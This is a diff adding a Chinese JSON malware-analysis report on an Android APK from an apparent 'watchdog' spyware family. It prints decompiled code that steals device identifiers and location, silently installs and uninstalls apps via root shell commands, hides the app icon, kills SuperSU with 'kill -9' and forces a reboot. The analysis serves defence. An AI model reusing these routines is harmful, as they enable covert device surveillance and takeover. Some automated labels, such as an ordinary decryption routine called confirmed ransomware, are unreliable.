@@ -1,0 +1,354 @@
+{
+  "APK信息": {
+    "文件名": "7eeadfe1aa5f6bb827f9cb921c63571e263e5c6b20b2e27ccc64a04eba51ca7a.apk",
+    "sha256": "7eeadfe1aa5f6bb827f9cb921c63571e263e5c6b20b2e27ccc64a04eba51ca7a",
+    "包名": "com.wCSinai",
+    "应用名": "C.Sinai",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 1393.9
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "wap_billing",
+          "中文名": "WAP计费",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "subscribe"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\android\\watchdog\\core\\af;",
+          "method_signature": "if(locationA != null)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "a(jSONArray5, \"provider\", locationA.getProvider());\na(jSONArray5, \"time_utc\", com.android.watchdog.a.af.a(locationA.getTime()));\njSONObject5.put(\"name\", \"current_position\");\nTelephonyManager telephonyManager = (TelephonyManager) this.a.getSystemService(\"phone\");\na(jSONArray6, \"imei\", telephonyManager.getDeviceId());\na(jSONArray6, \"imsi\", telephonyManager.getSubscriberId());\na(jSONArray6, \"line_number\", telephonyManager.getLine1Number());\na(jSONArray6, \"voicemail_number\", telephonyManager.getVoiceMailNumber());\na(jSONArray6, \"network_country_iso\", telephonyManager.getNetworkCountryIso());\na(jSONArray6, \"network_operator\", telephonyManager.getNetworkOperator() + \" (\" + telephonyManager.getNetworkOperatorName() + \")\");",
+          "malicious_code_snippet_context": "              a(jSONArray5, \"longitude\", locationA.getLongitude());\n              a(jSONArray5, \"speed\", locationA.getSpeed());\n              a(jSONArray5, \"altitude\", locationA.getAltitude());\n>>>             a(jSONArray5, \"provider\", locationA.getProvider());\n>>>             a(jSONArray5, \"time_utc\", com.android.watchdog.a.af.a(locationA.getTime()));\n>>>             jSONObject5.put(\"name\", \"current_position\");\n>>>             jSONObject5.put(\"_children_\", jSONArray5);\n>>>             jSONArray.put(jSONObject5);\n>>>         }\n>>>         JSONObject jSONObject6 = new JSONObject();\n>>>         JSONArray jSONArray6 = new JSONArray();\n>>>         TelephonyManager telephonyManager = (TelephonyManager) this.a.getSystemService(\"phone\");\n>>>         a(jSONArray6, \"imei\", telephonyManager.getDeviceId());\n          a(jSONArray6, \"imsi\", telephonyManager.getSubscriberId());\n          a(jSONArray6, \"sw_version\", telephonyManager.getDeviceSoftwareVersion());\n          a(jSONArray6, \"line_number\", telephonyManager.getLine1Number());",
+          "behavior_description": "该代码属于 com.android.watchdog 间谍软件家族的设备信息收集模块。数据来源为 Location（GPS位置 provider、UTC时间戳）和 TelephonyManager（IMEI、IMSI、本机号码、语音信箱号码、软件版本、网络国家码、运营商及网络制式），所有敏感数据被逐项写入结构化 JSON 报告（如 current_position、imei、imsi 等节点），构建完整的设备指纹用于回传远程C2服务器。其中 IMSI/运营商/网络国家码信息可用于识别受害者所属移动运营商及订阅状态，为后续 WAP 计费欺诈（构造运营商计费/订阅请求）和短信欺诈提供必要的设备指纹前提，属于恶意隐私窃取行为，直接导致用户隐私泄露。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "getDeviceId",
+          "getSubscriberId",
+          "ANDROID_ID"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\android\\watchdog\\a\\g;",
+          "method_signature": "a(Context context, String str)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "return h.a(\"SHA-256\", (str + \"_\" + ((TelephonyManager) context.getSystemService(\"phone\")).getDeviceId()).getBytes());",
+          "malicious_code_snippet_context": "  \n      public static String a(Context context, String str) {\n          try {\n>>>             return h.a(\"SHA-256\", (str + \"_\" + ((TelephonyManager) context.getSystemService(\"phone\")).getDeviceId()).getBytes());\n          } catch (NoSuchAlgorithmException e) {\n              return \"\";\n          }",
+          "behavior_description": "该方法位于混淆后的恶意包 com.android.watchdog.a.g 中，通过 context.getSystemService(\"phone\") 获取 TelephonyManager，调用 getDeviceId() 读取设备唯一标识符（IMEI/MEID），将其与传入字符串拼接后计算 SHA-256 哈希，生成稳定且唯一的设备指纹。该指纹通常被恶意程序用于在 C2 通信中唯一标识受感染设备、跟踪受害者或去重感染。结合同类中监控 getRunningTasks/topActivity 的代码，属于间谍类恶意软件的设备识别与信息收集行为。数据流向：TelephonyManager.getDeviceId()（采集 IMEI）→ 字符串拼接 → SHA-256 哈希 → 返回设备指纹供恶意程序后续上报/跟踪使用。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "location_tracking",
+      "中文名": "位置追踪",
+      "MITRE": "T1430",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.ACCESS_FINE_LOCATION",
+          "android.permission.ACCESS_COARSE_LOCATION"
+        ],
+        "字符串": [
+          "getLastKnownLocation",
+          "requestLocationUpdates"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\android\\watchdog\\a\\i;",
+          "method_signature": "a(Context context, Location location)",
+          "malicious_behavior": "location_tracking",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "LocationManager locationManager = (LocationManager) context.getSystemService(\"location\");\nCriteria criteria = new Criteria();\ncriteria.setAccuracy(2);\nLocation lastKnownLocation = locationManager.getLastKnownLocation(locationManager.getBestProvider(criteria, true));\nreturn (location == null || a(location, lastKnownLocation)) ? lastKnownLocation : location;\n...\njSONObject2.put(\"type\", \"Point\");\nJSONArray jSONArray = new JSONArray();",
+          "malicious_code_snippet_context": "      public static Location a(Context context, Location location) {\n          int i = d.a;\n          new StringBuilder(\"lastKnownLocation=\").append(location);\n>>>         LocationManager locationManager = (LocationManager) context.getSystemService(\"location\");\n>>>         Criteria criteria = new Criteria();\n>>>         criteria.setAccuracy(2);\n>>>         Location lastKnownLocation = locationManager.getLastKnownLocation(locationManager.getBestProvider(criteria, true));\n>>>         return (location == null || a(location, lastKnownLocation)) ? lastKnownLocation : location;\n>>>     }\n>>> \n>>>     public static void a(JSONObject jSONObject, Location location) throws JSONException {\n          if (jSONObject == null) {\n              return;\n          }",
+          "behavior_description": "该代码位于间谍类恶意软件包 com.android.watchdog 中，是位置追踪模块。首先通过 LocationManager 的 getLastKnownLocation() 获取设备最后已知位置，并与传入位置比较后选取可用位置；随后将位置数据序列化为 GeoJSON 格式（type=Point + 经纬度坐标数组），打包成 JSON 结构用于后续上报到远程服务器，实现 covert 位置追踪与隐私窃取。数据流向：LocationManager 位置数据 → JSON 序列化 → 远程上报。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->doFinal",
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "AES",
+              "encrypt"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\google\\android\\gms\\internal\\o;",
+          "method_signature": "if(bArrA.length <= 16)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "byte[] bArr2 = new byte[16];\nbyte[] bArr3 = new byte[bArrA.length - 16];\nbyteBufferAllocate.get(bArr2);\nbyteBufferAllocate.get(bArr3);\nSecretKeySpec secretKeySpec = new SecretKeySpec(bArr, \"AES\");\nCipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\ncipher.init(2, secretKeySpec, new IvParameterSpec(bArr2));\nreturn cipher.doFinal(bArr3);",
+          "malicious_code_snippet_context": "              ByteBuffer byteBufferAllocate = ByteBuffer.allocate(bArrA.length);\n              byteBufferAllocate.put(bArrA);\n              byteBufferAllocate.flip();\n>>>             byte[] bArr2 = new byte[16];\n>>>             byte[] bArr3 = new byte[bArrA.length - 16];\n>>>             byteBufferAllocate.get(bArr2);\n>>>             byteBufferAllocate.get(bArr3);\n>>>             SecretKeySpec secretKeySpec = new SecretKeySpec(bArr, \"AES\");\n>>>             Cipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n>>>             cipher.init(2, secretKeySpec, new IvParameterSpec(bArr2));\n>>>             return cipher.doFinal(bArr3);\n          } catch (IllegalArgumentException e) {\n              throw new a(e);\n          } catch (InvalidAlgorithmParameterException e2) {",
+          "behavior_description": "该代码是 AES/CBC/PKCS5Padding 解密例程：从输入字节数组 bArrA 中提取前16字节作为 IV，剩余部分作为密文，用密钥 bArr 构造 SecretKeySpec，以解密模式（init mode=2）初始化 Cipher 并调用 doFinal 完成解密。该类伪装在 com.google.android.gms.internal 包路径下（恶意样本常用的伪装手法），结合已确认的勒索软件文件加密行为，此例程属于勒索软件的密码学核心组件，用于解密文件数据或解密内置的加密配置/载荷以支撑勒索流程。数据流向：加密的文件字节/密文数据（bArrA，前16字节为IV）→ AES/CBC Cipher.doFinal() 解密操作。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ad_fraud",
+      "中文名": "广告欺诈",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "hidden_ad",
+          "中文名": "隐藏广告",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "loadAd",
+              "adView",
+              "Banner"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\appsgeyser\\sdk\\AppsgeyserSDK;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "ad_fraud",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "public static void takeOff(Application application, String APIkey) {\n    AppsgeyserSDKInternal.takeOff(application, APIkey);\n}\n\npublic static void setActivity(Activity activity) {",
+          "malicious_code_snippet_context": "  \n  /* JADX INFO: loaded from: classes.dex */\n  public class AppsgeyserSDK {\n>>>     public static void takeOff(Application application, String APIkey) {\n>>>         AppsgeyserSDKInternal.takeOff(application, APIkey);\n>>>     }\n>>> \n>>>     public static void setActivity(Activity activity) {\n          AppsgeyserSDKInternal.setActivity(activity);\n      }\n  ",
+          "behavior_description": "该代码是 AppsGeyser 广告 SDK 的对外入口门面类。数据流向：应用启动时的 Application 上下文与 APIkey 作为入参传入 takeOff() → 委托给内部引擎 AppsgeyserSDKInternal.takeOff() 完成广告引擎初始化，激活 AdView/FullScreenBanner 全屏广告模块 → setActivity() 注册当前 Activity 作为全屏广告的展示宿主。在已确认恶意的样本上下文中，此入口是广告欺诈行为的触发点：SDK 内部引擎随后会定时轮询广告并通过 FullScreenBanner 自动弹出全屏广告（无需用户交互）。但需注意，本片段本身仅为委托调用，未包含实际的定时轮询（Timer/postDelayed）、后台无界面调起 AdActivity 或虚假点击注入（MotionEvent.obtain/dispatchTouchEvent）的实现代码，实际欺诈逻辑位于 AppsgeyserSDKInternal、FullScreenBanner、AdController 等类中，建议进一步提取这些类的代码。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "silent_install_uninstall",
+      "中文名": "静默安装/卸载",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "silent_install",
+          "中文名": "静默安装",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "application/vnd.android.package-archive"
+            ]
+          }
+        },
+        {
+          "子行为": "silent_uninstall",
+          "中文名": "静默卸载",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "android.intent.action.DELETE"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\android\\watchdog\\core\\d;",
+          "method_signature": "if(com.android.watchdog.a.o.b()",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (com.android.watchdog.a.o.b() <= 0) {\n    Intent intent = new Intent(\"android.intent.action.VIEW\");\n    intent.setDataAndType(Uri.fromFile(new File(strA)), \"application/vnd.android.package-archive\");\n    context.startActivity(intent);\n} else {\n    boolean z3 = context.getPackageManager().getPackageArchiveInfo(strA, 0) != null;\n    com.android.watchdog.a.o.e(strA, \"755\");\n    iA = z3 ? com.android.watchdog.a.o.a(\"pm install -r \" + strA) : com.android.watchdog.a.o.a(\"pm install \" + strA);\n}",
+          "malicious_code_snippet_context": "              return;\n          }\n          Context context = this.a;\n>>>         if (com.android.watchdog.a.o.b() <= 0) {\n>>>             Intent intent = new Intent(\"android.intent.action.VIEW\");\n>>>             intent.setDataAndType(Uri.fromFile(new File(strA)), \"application/vnd.android.package-archive\");\n>>>             intent.setFlags(DriveFile.MODE_READ_ONLY);\n>>>             context.startActivity(intent);\n>>>             iA = 0;\n>>>         } else {\n>>>             boolean z3 = context.getPackageManager().getPackageArchiveInfo(strA, 0) != null;\n>>>             com.android.watchdog.a.o.e(strA, \"755\");\n              iA = z3 ? com.android.watchdog.a.o.a(\"pm install -r \" + strA) : com.android.watchdog.a.o.a(\"pm install \" + strA);\n          }\n          if (iA != 0) {",
+          "behavior_description": "该代码实现了APK静默安装逻辑。当检测到设备具有root权限时（o.b() > 0），先通过chmod 755设置APK文件可执行权限，然后执行shell命令 'pm install -r <path>' 或 'pm install <path>' 静默安装APK，完全绕过用户确认。仅在无root权限时才降级为ACTION_VIEW Intent调起系统安装界面。数据流向：下载的APK文件路径→chmod 755→pm install shell命令静默安装。这是典型的恶意软件利用root权限静默部署额外payload的行为，无需用户任何交互即可安装任意APK。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lcom\\android\\watchdog\\core\\d;",
+          "method_signature": "if(packageInfoA == null)",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "PackageInfo packageInfoA = com.android.watchdog.a.k.a(context, str);\nif (packageInfoA == null) {\n    iA = -2;\n} else if (com.android.watchdog.a.o.b() > 0) {\n    iA = com.android.watchdog.a.k.a(context, packageInfoA, strArr);\n} else {\n    Intent intent = new Intent(\"android.intent.action.DELETE\", Uri.fromParts(\"package\", packageInfoA.packageName, null));\n    context.startActivity(intent);\n    iA = 0;\n}",
+          "malicious_code_snippet_context": "              strArr = null;\n          }\n          Context context = this.a;\n>>>         PackageInfo packageInfoA = com.android.watchdog.a.k.a(context, str);\n>>>         if (packageInfoA == null) {\n>>>             iA = -2;\n>>>         } else if (com.android.watchdog.a.o.b() > 0) {\n>>>             iA = com.android.watchdog.a.k.a(context, packageInfoA, strArr);\n>>>         } else {\n>>>             Intent intent = new Intent(\"android.intent.action.DELETE\", Uri.fromParts(\"package\", packageInfoA.packageName, null));\n>>>             intent.setFlags(DriveFile.MODE_READ_ONLY);\n>>>             context.startActivity(intent);\n>>>             iA = 0;\n          }\n          switch (iA) {\n              case -2:",
+          "behavior_description": "该代码实现了一个卸载指定应用的功能模块：接收目标包名 str（数据来源，通常由 C2 远程指令或硬编码目标列表下发），先查询该包的 PackageInfo；若设备已获取 root 权限（com.android.watchdog.a.o.b() > 0），则调用 k.a() 以 root 权限执行静默卸载（典型实现为 su 执行 pm uninstall），全程无用户感知；仅在无 root 时才降级为调起系统卸载确认对话框（ACTION_DELETE，需用户点击）。结合该样本为已确认恶意软件（com.android.watchdog 家族），此能力典型用于静默移除安全防护软件或竞争恶意样本，属于静默卸载恶意行为；静默路径需 root 条件触发，故风险定为中。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "screen_capture",
+      "中文名": "屏幕截图/录屏",
+      "MITRE": "T1413",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "takeScreenshot"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\appsgeyser\\sdk\\ads\\FullscreenBannerJsInterface;",
+          "method_signature": "takeScreenShot()",
+          "malicious_behavior": "screen_capture",
+          "behavior_type": "grayware",
+          "risk_level": "低",
+          "malicious_code_snippet": "@JavascriptInterface\npublic String takeScreenShot() {\n    WebView view = this._fsBanner.getWebView();\n    return WebViewScreenShooter.takeScreenShotInBase64(view);\n}",
+          "malicious_code_snippet_context": "          this._fsBanner = fullScreenBanner;\n      }\n  \n>>>     @JavascriptInterface\n>>>     public void stayAlive() {\n>>>         this._fsBanner.stayAlive();\n>>>     }\n>>> \n      @JavascriptInterface\n      public void showAdMobFullScreenBanner(String adUnitID, String keywords, String genderString, String birthday, String latitude, String longtitude) {\n          this._fsBanner.showAdMobFSBanner(adUnitID, keywords, genderString, birthday, latitude, longtitude);",
+          "behavior_description": "该代码位于AppsGeyser广告SDK的全屏横幅JavaScript接口中，通过@JavascriptInterface将takeScreenShot方法暴露给广告WebView内的JS脚本调用。调用时获取全屏横幅广告的WebView实例，对其当前渲染内容执行截图并编码为Base64字符串返回给JS层，JS脚本随后可将截图数据发送至任意远程服务器。数据流向：广告WebView渲染内容(source)→静默截图并Base64编码→返回给JavaScript层可被外传至远程服务器(sink)。该截图行为在用户完全无感知的情况下进行，通常用于广告可见性验证或广告欺诈统计。但由于截图范围仅限于广告自身的WebView渲染内容（即广告本身），而非用户实际屏幕上的隐私数据，直接隐私泄露风险有限，属于广告SDK的隐蔽数据采集行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\android\\watchdog\\core\\h;",
+          "method_signature": "if(zA3)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "this.i.getPackageManager().setComponentEnabledSetting(new ComponentName(this.i, (Class<?>) MainActivity.class), 2, 1);",
+          "malicious_code_snippet_context": "                  this.f = new e(this.i);\n                  this.g = new d(this.i);\n                  try {\n>>>                     this.i.getPackageManager().setComponentEnabledSetting(new ComponentName(this.i, (Class<?>) MainActivity.class), 2, 1);\n                  } catch (Exception e2) {\n                      int i14 = com.android.watchdog.a.d.b;\n                  }",
+          "behavior_description": "该代码在应用初始化流程中（com.android.watchdog.core.h 类，疑似伪装成系统看门狗的恶意样本），调用 PackageManager.setComponentEnabledSetting() 将自身的 MainActivity 组件设置为禁用状态（参数 2 = COMPONENT_ENABLED_STATE_DISABLED），并附带 DONT_KILL_APP 标志（参数 1），使应用进程不被杀死。数据流向：应用内部状态（zA3 条件判断）→ setComponentEnabledSetting() 禁用启动入口组件。结果是应用图标从桌面启动器中消失，用户无法感知应用存在、无法通过图标找到并卸载，而恶意服务仍在后台持续运行，属于典型的恶意软件隐蔽驻留/逃避卸载技术。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "process_kill",
+      "中文名": "进程杀死",
+      "MITRE": "",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.KILL_BACKGROUND_PROCESSES"
+        ],
+        "字符串": [
+          "killBackgroundProcesses",
+          "killProcess"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\android\\watchdog\\core\\w;",
+          "method_signature": "if(iB != -1)",
+          "malicious_behavior": "process_kill",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "ag.a(nodeItem2, \"value\").setNodeValue(\"true\"); // config_default_trustsystem\nint iB = com.android.watchdog.a.g.b(context, \"eu.chainfire.supersu\");\nif (iB != -1) {\n    ((ActivityManager) context.getSystemService(\"activity\")).killBackgroundProcesses(\"eu.chainfire.supersu\");\n    Process.killProcess(iB);\n    Process.sendSignal(iB, 3);\n    Process.sendSignal(iB, 9);\n    com.android.watchdog.a.o.a(\"kill -9 \" + iB);\n}",
+          "malicious_code_snippet_context": "ag.a(nodeItem2, \"value\").setNodeValue(\"true\"); // config_default_trustsystem\nint iB = com.android.watchdog.a.g.b(context, \"eu.chainfire.supersu\");\nif (iB != -1) {\n    ((ActivityManager) context.getSystemService(\"activity\")).killBackgroundProcesses(\"eu.chainfire.supersu\");\n    Process.killProcess(iB);\n    Process.sendSignal(iB, 3);\n    Process.sendSignal(iB, 9);\n    com.android.watchdog.a.o.a(\"kill -9 \" + iB);\n}",
+          "behavior_description": "该代码首先篡改SuperSU（root权限管理器）的XML配置文件，将config_default_trustsystem设为true（使SuperSU默认信任系统应用，为恶意程序静默获取root权限铺路），并将写回磁盘。随后数据流向为：通过com.android.watchdog.a.g.b(context, \"eu.chainfire.supersu\")查询SuperSU进程PID（source）→ 使用四种手段强制杀死该安全防护进程（sink）：ActivityManager.killBackgroundProcesses、Process.killProcess、Process.sendSignal发送SIGQUIT(3)与SIGKILL(9)信号、以及执行shell命令\"kill -9\"。杀死SuperSU迫使其重启并加载被篡改的配置，属于提权辅助与安全防护规避（对抗安全工具）行为，是恶意样本攻击链的关键环节。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_reboot",
+      "中文名": "设备重启",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "reboot"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\android\\watchdog\\a\\k;",
+          "method_signature": "if(iE2 != 0)",
+          "malicious_behavior": "device_reboot",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "int iE2 = o.e(str2, \"644\");\nreturn o.a(context, new String[]{\"pm uninstall \" + packageArchiveInfo.packageName, \"reboot\"}, false);",
+          "malicious_code_snippet_context": "              new StringBuilder(\"Error copying \").append(str).append(\" to \").append(str2);\n              return iA2;\n          }\n>>>         int iE2 = o.e(str2, \"644\");\n>>>         if (iE2 != 0) {\n              int i4 = d.b;\n              return iE2;\n          }",
+          "behavior_description": "该代码是恶意软件将自身安装为系统应用的持久化流程：先将文件（APK）复制到目标路径（疑似/system系统分区，前文有'Error copying'日志），再通过chmod设置644权限，随后以root/shell权限执行命令数组——先用'pm uninstall <包名>'卸载用户安装的原应用，再执行'reboot'强制重启设备，使新植入的系统应用生效。数据流向：PackageManager解析的包名→拼接进shell命令→静默执行卸载与重启。设备在用户无感知的情况下被强制重启，属于明确的恶意破坏与持久化行为。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
